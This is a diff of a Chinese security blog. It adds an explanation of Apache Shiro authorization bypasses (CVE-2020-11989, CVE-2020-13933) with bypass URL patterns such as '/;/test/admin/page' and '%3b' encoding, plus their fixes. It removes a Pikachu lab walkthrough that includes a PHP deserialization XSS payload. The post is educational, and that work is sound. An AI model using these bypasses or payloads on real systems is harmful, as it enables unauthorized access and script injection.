+<li><p>由（CVE-2020-2957）修补方式可知；requestURI的获取方式为通过getContextPath() 、getServletPath()、getPathInfo()获取并拼接得到，获取到的requestURI为/;/test//admin/page。</p>
+</li>
+<li><p>然后传入decodeAndCleanUriString，根据“；”进行URL截断，所以最终返回了/，传入后decodeAndCleanUriString变成了/。</p>
+</li>
+</ul>
+<p>（由于“/”不是禁止访问目录，所以可以绕过shiro鉴权拦截器）</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184309614.png" alt="image-20230813184309614"></p>
+<p><strong>contextPath</strong>:/;/test,     应用不能部署在根目录，也就是需要context-path，server.servlet.context-path=/test;</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184327784.png" alt="image-20230813184327784"></p>
+<p>getRequestUri 获取到的是:”/”</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184344695.png" alt="image-20230813184344695"></p>
+<p>decodeAndCleanUriString():/</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184353276.png" alt="image-20230813184353276"></p>
+<ul>
+<li><p><strong>/;/test//admin/page</strong>传入spring控制器（此版本没有权限校验），由getPathWithinServletMapping()格式化处理后，最后返回**/admin/page**，成功访问未授权目录。</p>
+<p>contextPath:/;/test</p>
+<p>PathwithinApp：/test/admin/page</p>
+<p>ServeletPath：/admin/page</p>
+</li>
+</ul>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184437756.png" alt="image-20230813184437756"></p>
+<p>【<strong>关系链</strong>】</p>
+<ul>
+<li> <strong>Shiro鉴权器</strong></li>
+</ul>
+<p><strong>getChain函数（权限判定）</strong></p>
+<p><strong>⟶ getPathWithinApplication函数（获取完整url：<font color="red">http://… /;/test/admin/page</font>）</strong></p>
+<p><strong>⟶ getRequestUri函数（获取RequestUri：<font color="red">/;/test//admin/page</font>）</strong></p>
+<p><strong>⟶ decodeAndCleanUriString函数（url清洗）：如果URI中存在;号的话，则会删除其后面的所有字符,得到<font color="red">/</font></strong></p>
+<p>⟶ <strong>绕过shiro鉴权器</strong></p>
+<ul>
+<li><strong>spring控制器</strong></li>
+</ul>
+<p><strong>RequestUri（ <font color="red">/;/test//admin/page</font>）传入 spring控制器</strong></p>
+<p><strong>⟶ getPathWithinServletMapping()</strong></p>
+<p><strong>⟶ServeletPath：<font color="red">/admin/page</font></strong></p>
+<p><strong>⟶访问/admin/page</strong></p>
+<h3 id="0x04-POC-EXP-漏洞利用-2"><a href="#0x04-POC-EXP-漏洞利用-2" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        只要根据漏洞环境去构造payload地址即可。例如如果直接访问 /test/admin/page，会返回302跳转要求登录，访问 /;/test/admin/page, 就能直接绕过Shiro权限验证，访问到/admin路由中的信息</p>
+<h3 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h3><p>​        Shiro 1.5.3修改了URL获取的逻辑，不单独处理context-path，（单独处理时可以在判断context-path时进行绕过）<br> org.apache.shiro.web.util.WebUtils#getPathWithinApplication</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185051542.png" alt="image-20230813185051542"></p>
+<p>因此就无法再通过构造context-path的方式来进行绕过了。</p>
+<h2 id="Apache-Shiro-权限绕过漏洞（CVE-2020-13933）"><a href="#Apache-Shiro-权限绕过漏洞（CVE-2020-13933）" class="headerlink" title="Apache Shiro 权限绕过漏洞（CVE-2020-13933）"></a>Apache Shiro 权限绕过漏洞（CVE-2020-13933）</h2><h3 id="0x01-漏洞介绍-5"><a href="#0x01-漏洞介绍-5" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        Apache Shiro的CVE-2020-11989修补补丁依旧存在缺陷，由于shiro和spring在处理url中仍然存在差别，通过构造特殊的HTTP请求，可以再次绕过授权，访问未授权的信息。访问/read/xx，被302重定向到了/login,而访问/read/%3bxxx，能够绕过认证。</p>
+<h3 id="0x02-漏洞环境-测绘指纹-5"><a href="#0x02-漏洞环境-测绘指纹-5" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
+<li>Apache Shiro &lt; 1.6.0</li>
+<li> Spring 框架中只使用 Shiro 鉴权</li>
+</ul>
+<h3 id="0x03漏洞原理-1"><a href="#0x03漏洞原理-1" class="headerlink" title="0x03漏洞原理"></a>0x03漏洞原理</h3><p>【<strong>key</strong>】shiro和spring在处理url中仍然存在差别</p>
+<p>假设条件：**/admin/{name}<strong>是授权访问目录（</strong>/admin**不需要授权访问）</p>
+<p>【<strong>shiro处理URI</strong>】</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185238889.png" alt="image-20230813185238889"></p>
+<p>若输入：**/admin/%3bpage**</p>
+<p>传入/admin/%3bpage 解码后为**/admin/;bpage** ，传入removeSenicolon（）</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185337503.png" alt="image-20230813185337503"></p>
+<p>removeSenicolon()根据“；”分隔符进行截取，返回**/admin/**到requestURI。</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185354022.png" alt="image-20230813185354022"></p>
+<p>此处因为/admin/没有匹配到具体资源路径（不需要授权访问），所以通过过滤器到达Spring的处理逻辑。</p>
+<p>【<strong>spring处理URI</strong>】</p>
+<p>​        注意这里Spring的处理逻辑为先去判断URI中是否存在“；”等特殊字符，如果存在就先处理（删除）再匹配路径。（没有先编码再判断是否存在特殊符号）</p>
+<p>getPathWithinApplication()传入getRequestUrl的是<font color="red">/admin/%3bpage</font> <img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185455706.png" alt="image-20230813185455706"></p>
+<p>DecodeAndCleanUriString()清洗数据的时候，removeSemicolonContentInternal()清洗模块没有进行编码“%3b”，即没有发现“；”，所以返回结果是**/admin/%3bpage<strong>。然后到decodeRequestString()进行解码得到</strong>/admin/;page**.</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185548331.png" alt="image-20230813185548331"></p>
+<p>removeSemicolonContentInternal()执行细节</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185555497.png" alt="image-20230813185555497"></p>
+<p><strong>/admin/;page</strong>之后进行匹配为**/admin/page**，从而获取相应资源。</p>
+<h3 id="0x04-POC-EXP-漏洞利用-3"><a href="#0x04-POC-EXP-漏洞利用-3" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        由于shiro和spring在处理url中仍然存在差别，通过构造特殊的HTTP请求，可以再次绕过授权，访问未授权的信息。访问/admin/xx，被302重定向到了/login,而访问/read/%3bxxx，能够绕过认证，直接访问/read/xxx。</p>
+<h3 id="0x05-漏洞修补"><a href="#0x05-漏洞修补" class="headerlink" title="0x05 漏洞修补"></a>0x05 漏洞修补</h3><p>​        添加一个一个InvalidRequestFilter类，该类从全局上对分号，反斜杠和非ASCII字符进行了过滤。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/emgexgb_sef/article/details/123863818">https://blog.csdn.net/emgexgb_sef/article/details/123863818</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1317,347 +1758,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/" class="post-title-link" itemprop="url">Pichaku靶场通关笔记-下</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-08-01 20:51:18" itemprop="dateCreated datePublished" datetime="2023-08-01T20:51:18+08:00">2023-08-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-02 21:10:59" itemprop="dateModified" datetime="2023-08-02T21:10:59+08:00">2023-08-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Pikachu靶场通关笔记-下"><a href="#Pikachu靶场通关笔记-下" class="headerlink" title="Pikachu靶场通关笔记-下"></a>Pikachu靶场通关笔记-下</h1><h4 id="Over-permission（越权漏洞）-水平越权-垂直越权"><a href="#Over-permission（越权漏洞）-水平越权-垂直越权" class="headerlink" title="Over permission（越权漏洞）    水平越权        垂直越权"></a>Over permission（越权漏洞）    <a href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83">水平越权</a>        <a href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83">垂直越权</a></h4><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="../../    ../../(目录遍历)"></a>../../    <a href="#../../(%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86)">../../(目录遍历)</a></h4><h4 id="I-can-see-your-ABC-敏感信息泄露-敏感信息泄露"><a href="#I-can-see-your-ABC-敏感信息泄露-敏感信息泄露" class="headerlink" title="I can see your ABC(敏感信息泄露)     敏感信息泄露"></a>I can see your ABC(敏感信息泄露)     <a href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">敏感信息泄露</a></h4><h4 id="PHP反序列化-PHP反序列化"><a href="#PHP反序列化-PHP反序列化" class="headerlink" title="PHP反序列化    PHP反序列化"></a>PHP反序列化    <a href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化</a></h4><h4 id="XXE-XXE漏洞"><a href="#XXE-XXE漏洞" class="headerlink" title="XXE    XXE漏洞"></a>XXE    <a href="#XXE%E6%BC%8F%E6%B4%9E">XXE漏洞</a></h4><h4 id="URL重定向-不安全的URL跳转"><a href="#URL重定向-不安全的URL跳转" class="headerlink" title="URL重定向    不安全的URL跳转"></a>URL重定向    <a href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC">不安全的URL跳转</a></h4><h4 id="SSRF-SSRF（curl）-SSRF（fgc）"><a href="#SSRF-SSRF（curl）-SSRF（fgc）" class="headerlink" title="SSRF    SSRF（curl）        SSRF（fgc）"></a>SSRF    <a href="#SSRF%EF%BC%88curl%EF%BC%89">SSRF（curl）</a>        <a href="#SSRF%EF%BC%88fgc%EF%BC%89">SSRF（fgc）</a></h4><h2 id="Over-permission（越权漏洞）"><a href="#Over-permission（越权漏洞）" class="headerlink" title="Over permission（越权漏洞）"></a>Over permission（越权漏洞）</h2><p>​        如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。以下是越权漏洞的步骤、攻击方法和防御方法。</p>
-<p>步骤：</p>
-<ol>
-<li>攻击者通过渗透测试或其他方式，获取到目标网站的漏洞或不当配置。</li>
-<li>攻击者利用漏洞或不当配置，获取到未授权的权限或访问未授权的资源。</li>
-<li>攻击者利用所获得的权限进行攻击，如获取敏感信息、修改数据等。</li>
-</ol>
-<p>攻击方法：</p>
-<ol>
-<li>直接访问URL：攻击者可以直接访问受限制的URL，如管理后台、用户个人信息等。</li>
-<li>修改参数：攻击者可以修改请求参数，如将用户ID改为其他用户的ID，以获取其他用户的信息。</li>
-<li>暴力猜解：攻击者可以通过暴力猜解密码等方式，获取到受限制的权限。</li>
-<li>会话劫持：攻击者可以通过劫持会话，获取到受限制的权限。</li>
-</ol>
-<p>防御方法：</p>
-<ol>
-<li>权限控制：在程序中对用户权限进行控制，限制用户对资源的访问。（1）使用最小权限原则对用户进行赋权;（2）使用合理（严格）的权限校验规则;（3）使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件。</li>
-<li>输入验证：对用户输入的数据进行验证和过滤，防止攻击者通过修改参数获取未授权的访问。</li>
-<li>会话管理：采用合适的会话管理机制，如使用HTTPS协议、设置有效期、强制重新登录等。</li>
-<li>安全配置：对服务器和应用程序进行安全配置，如关闭不必要的服务和端口、限制访问权限等。</li>
-<li>安全审计：对程序进行安全审计，及时发现和修复漏洞，提高程序的安全性。</li>
-</ol>
-<h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>了解到有3个用户</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313165058409.png" alt="image-20230313165058409" style="zoom:50%;">
-
-<p>正常登录，点击查看个人信息；在url出发现查询关键字</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313165227001.png" alt="image-20230313165227001" style="zoom:50%;">
-
-
-
-<p>直接修改url的查询用户，可以发现即使没有登录lucy账号也能查看其信息</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313165354353.png" alt="image-20230313165354353" style="zoom:50%;">
-
-
-
-<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>先用超级用户登录，了解其特权有那些</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313172041540.png" alt="image-20230313172041540" style="zoom:50%;">
-
-<p>发现可以添加和删除用户，进入添加用户界面，查看界面；发现url使用用户名来命名连接</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313172119798.png" alt="image-20230313172119798" style="zoom:50%;">
-
-<p>登录普通用户，发现只可以查看；尝试修改连接的用户名为超级用户</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313172304204.png" alt="image-20230313172304204" style="zoom: 33%;">
-
-<p>在主页面（查看）会跳出并需要重新登录；再尝试把添加用户的连接直接搬运过来</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313172550983.png" alt="image-20230313172550983" style="zoom: 33%;">
-
-<p>回车后直接跳转到添加用户界面，添加用户</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313172701887.png" alt="image-20230313172701887" style="zoom: 33%;">
-
-<p>再次登录，可以查看到刚添加的用户</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313191914128.png" alt="image-20230313191914128" style="zoom: 33%;">
-
-
-
-<h2 id="目录遍历-1"><a href="#目录遍历-1" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>​        在web功能设计中,很多时候会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。<br>​        看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样。需要区分一下的是,如果通过不带参数的url（比如：<a target="_blank" rel="noopener" href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E8%BF%99%E9%87%8C%E7%A7%B0%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，这里称为敏感信息泄露</a> 而并不归为目录遍历漏洞。</p>
-<p>目录遍历漏洞（Directory Traversal Vulnerability），也称为路径遍历漏洞，是指攻击者通过输入特殊的字符序列，绕过文件访问控制，获取未授权的访问权限，可以访问受保护的系统文件、敏感数据和应用程序源代码等，进而对系统造成危害。</p>
-<p>目录遍历漏洞攻击通常涉及以下步骤：</p>
-<ol>
-<li>攻击者通过URL或Web应用程序界面输入一个带有特殊字符的参数（如 ../ 等）来绕过应用程序的文件访问控制。</li>
-<li>应用程序没有正确地过滤或验证该参数，因此攻击者可以访问未授权的文件或目录。</li>
-<li>攻击者可以执行恶意代码，访问敏感数据或者修改系统文件，从而控制整个应用程序或者系统。</li>
-</ol>
-<p>目录遍历漏洞常见的攻击方法包括：</p>
-<ol>
-<li>输入 ../ 或 ..\ 等字符序列来向上遍历目录，从而访问父目录及其它目录中的文件。</li>
-<li>利用 %00 空字节截断技术绕过文件名的限制，访问被截断后的文件。</li>
-<li>利用 URL 编码、Unicode 编码、HTML 实体编码等技术绕过应用程序的过滤和检查，访问目标文件。</li>
-</ol>
-<p>防御目录遍历漏洞的方法包括：</p>
-<ol>
-<li>对输入的参数进行过滤和验证，确保只能访问受控的文件和目录。</li>
-<li>应用程序和Web服务器应该在访问文件和目录时使用绝对路径，而不是相对路径。</li>
-<li>禁止使用特殊字符和文件名，如 ../ 、 ..\ 、 %00 等。</li>
-<li>确保Web服务器配置安全，限制应用程序的访问权限，避免攻击者利用目录遍历漏洞访问系统文件和目录。</li>
-<li>更新应用程序和操作系统的补丁，确保已修复已知的目录遍历漏洞。</li>
-</ol>
-<h4 id="目录遍历-2"><a href="#目录遍历-2" class="headerlink" title="../../(目录遍历)"></a>../../(目录遍历)</h4><p>​        如果知道目录，就可以进行目录遍历，例如</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313211021024.png" alt="image-20230313211021024" style="zoom:50%;">
-
-<p>效果</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313210914295.png" alt="image-20230313210914295" style="zoom:50%;">
-
-
-
-<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>​        敏感信息泄露漏洞是指未经授权访问，通过各种手段（例如：爬虫、目录遍历、注入攻击等）获取到敏感信息并且泄露出去，从而导致用户的隐私被泄露或者公司的机密信息被泄露的一种漏洞。由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br> —输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br> —前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
-<p>攻击者通过敏感信息泄露漏洞可以获取到包括但不限于以下信息：</p>
-<ol>
-<li>用户名、密码等登录凭证</li>
-<li>个人身份证号码、手机号码等隐私信息</li>
-<li>公司机密文件、源代码等重要信息</li>
-</ol>
-<p>以下是敏感信息泄露漏洞的攻击方法和防御方法：</p>
-<p>【攻击方法】：</p>
-<ol>
-<li>爬虫：攻击者通过编写爬虫程序，对网站的数据进行抓取，并存储在自己的数据库中。</li>
-<li>目录遍历：攻击者通过利用目录遍历漏洞，获取到服务器上的敏感信息。</li>
-<li>注入攻击：攻击者通过SQL注入等攻击手段，获取到网站数据库中的敏感信息。</li>
-<li>钓鱼网站：攻击者制作钓鱼网站，通过欺骗用户输入个人敏感信息的方式，获取用户的敏感信息。</li>
-</ol>
-<p>【防御方法】：</p>
-<ol>
-<li>对于爬虫攻击，可以使用反爬虫技术，例如：设置验证码、IP频率限制、User-Agent限制等。</li>
-<li>对于目录遍历漏洞，应该对网站的目录权限进行正确的设置，并且禁止用户输入../等目录遍历符号。</li>
-<li>对于注入攻击，应该对用户输入的数据进行正确的过滤和验证，并使用预编译语句等技术来避免SQL注入攻击。</li>
-<li>对于钓鱼网站，应该加强对用户的身份验证，例如使用双因素身份认证等技术，同时提高用户对钓鱼网站的识别能力。</li>
-</ol>
-<h4 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h4><p>正常输入，发现有url处有敏感信息泄露</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313212059625.png" alt="image-20230313212059625" style="zoom: 33%;">
-
-<p>打开“开发者工具”，发现测试账号和密码</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313212338893.png" alt="image-20230313212338893" style="zoom: 33%;">
-
-<p>登录，多处都可以发现敏感信息</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313212610881.png" alt="image-20230313212610881" style="zoom: 50%;">
-
-
-
-<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。</p>
-<p><strong>序列化serialize()</strong><br>            序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:            </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    public $test&#x3D;&quot;pikachu&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$s&#x3D;new S(); &#x2F;&#x2F;创建一个对象</span><br><span class="line">serialize($s); &#x2F;&#x2F;把这个对象进行序列化</span><br><span class="line">序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">    O:代表object</span><br><span class="line">    1:代表对象名字长度为一个字符</span><br><span class="line">    S:对象的名称</span><br><span class="line">    1:代表对象里面有一个变量</span><br><span class="line">    s:数据类型</span><br><span class="line">    4:变量名称的长度</span><br><span class="line">    test:变量名称</span><br><span class="line">    s:数据类型</span><br><span class="line">    7:变量值的长度</span><br><span class="line">    pikachu:变量值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><strong>反序列化unserialize()</strong></p>
-<p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$u&#x3D;unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">echo $u-&gt;test; &#x2F;&#x2F;得到的结果为pikachu</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">漏洞举例:</span><br><span class="line"></span><br><span class="line">class S&#123;</span><br><span class="line">    var $test &#x3D; &quot;pikachu&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s &#x3D; $_GET[&#39;test&#39;];</span><br><span class="line">@$unser &#x3D; unserialize($a);</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>直接输入序列化数据，如上面的payload</p>
-<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230313214848710.png" alt="image-20230313214848710" style="zoom:50%;">
-
-<p>通过构造序列化数据，可以查看更多信息，如查看cookie</p>
-<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B/image-20230802211045682.png" alt="image-20230802211045682"></p>
